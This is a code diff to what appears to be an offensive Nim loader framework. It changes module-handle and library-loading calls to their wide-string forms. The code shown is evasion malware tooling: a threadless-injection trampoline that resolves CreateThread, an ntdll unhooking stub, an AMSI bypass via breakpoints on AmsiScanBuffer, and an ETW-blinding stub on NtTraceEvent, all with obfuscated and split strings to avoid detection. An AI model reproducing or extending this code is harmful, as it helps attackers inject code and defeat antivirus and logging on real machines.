@@ -195,8 +195,10 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
     moveMemory(unsafeAddr trampolineStk[43], &lowBytePatched, sizeof(DWORD64))
     moveMemory(unsafeAddr trampolineStk[60], unsafeAddr jumpAddress, sizeof(DWORD64))
     when defined(threadlessthread):
+        var kernel32_string = obf("kernel32.dll")
+        var kernel32_wstring: WideCString = newWideCString(kernel32_string)
         # get the address of CreateThread via GetProcAddress/GetModuleHandle
-        var kernel32: HMODULE = GetModuleHandleA(obf("kernel32.dll"))
+        var kernel32: HMODULE = GetModuleHandleW(kernel32_wstring)
         var createThread: LPVOID = GetProcAddress(kernel32, obf("CreateThread"))
         moveMemory(unsafeAddr trampolineStk[70], unsafeAddr createThread, sizeof(DWORD64))
     # Write the trampoline somewhere in memory
@@ -958,16 +960,16 @@ let UnhookStub * = """
             if(dllName == obf("clr.dll")):
                 clrStart()
                 Sleep(2500)
-
+        var dllname_wstring: WideCString = newWideCString(dllName)
         when defined(DInvoke):
-            var ntdllModule = MyGetModuleHandleA(dllName)
+            var ntdllModule = MyGetModuleHandleW(dllname_wstring)
         else:
-            var ntdllModule = GetModuleHandleA(dllName)
+            var ntdllModule = GetModuleHandleW(dllname_wstring)
         if ntdllModule == 0:
             when defined(verbose):
                 echo obf("Could not get handle for ") & dllName & obf(", loading it..")
             when defined(DInvoke):
-                ntdllModule = MyLoadLibraryA(dllName)
+                ntdllModule = MyLoadLibraryW(dllName)
             else:
                 ntdllModule = LoadLibraryA(dllName)
             
@@ -1836,12 +1838,14 @@ let AmsiStub * = """
         threadCtx.ContextFlags = CONTEXT_ALL
 
         # Load amsi.dll if it hasn't be loaded alreay.
+        var amsiwideString = obf("amsi.dll")
+        var wideamsi: WideCString = newWideCString(amsiwideString)
         var split: string = obf("si.dll")
         if g_amsiScanBufferPtr == nil:
             when defined(DInvoke):
-                var amsi = MyGetModuleHandleA(obf("am")&split)
+                var amsi = MyGetModuleHandleW(cast[LPCWSTR](wideamsi))
             else:
-                var amsi = GetModuleHandleA(obf("am")&split)
+                var amsi = GetModuleHandleW(cast[LPCWSTR](wideamsi))
             
             var ModuleFileName: UNICODE_STRING
             when defined(DInvoke):
@@ -2178,10 +2182,12 @@ let ETWStub * = """
     proc SetupETWBreakpoints(): void =
         # Load ntdll.dll if it hasn't be loaded alreay.
         if g_ntTraceEventBufferPtr == nil:
+            var ntdllwideString = obf("ntdll.dll")
+            var widentdll: WideCString = newWideCString(ntdllwideString)
             when defined(DInvoke):
-                var ntdll = MyGetModuleHandleA(obf("ntdll.dll"))
+                var ntdll = MyGetModuleHandleW(cast[LPCWSTR](widentdll))
             else:
-                var ntdll = GetModuleHandleA(obf("ntdll.dll"))
+                var ntdll = GetModuleHandleW(cast[LPCWSTR](widentdll))
             
             if(ntdll == 0):
                 var randblup3: string = obf("iuiazdoasdia")
